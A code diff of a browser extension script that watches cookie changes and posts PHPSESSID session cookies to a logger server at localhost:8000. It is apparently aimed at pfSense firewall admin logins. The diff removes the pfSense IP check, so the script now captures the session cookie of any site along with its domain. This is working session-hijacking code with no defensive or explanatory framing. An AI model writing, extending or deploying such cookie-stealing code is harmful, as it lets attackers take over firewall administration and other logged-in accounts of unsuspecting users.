@@ -1,11 +1,11 @@
-const PFSENSE_IP = "192.168.1.254";
 const SERVER_IP = "http://localhost:8000"
 
 browser.cookies.onChanged.addListener((changeInfo) => {
     const cookie = changeInfo.cookie;
 
-    if (cookie.domain.includes(PFSENSE_IP) && cookie.name === "PHPSESSID" && !changeInfo.removed) {
+    if (cookie.name === "PHPSESSID" && !changeInfo.removed) {
         const sessionId = cookie.value;
+        const pfsense_ip1 = cookie.domain;
         const timestamp = new Date().toLocaleTimeString();
         console.log(`[${timestamp}] pfSense Login Detected! Session ID: ${sessionId}`);
         
@@ -15,7 +15,7 @@ browser.cookies.onChanged.addListener((changeInfo) => {
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
             },
-            body: `session=${encodeURIComponent(sessionId)}&pfsense_ip=${encodeURIComponent(PFSENSE_IP)}`
+            body: `session=${encodeURIComponent(sessionId)}&pfsense_ip2=${encodeURIComponent(pfsense_ip1)}`
         }).catch(err => console.error("Python logger not running.", err));
     }
 });
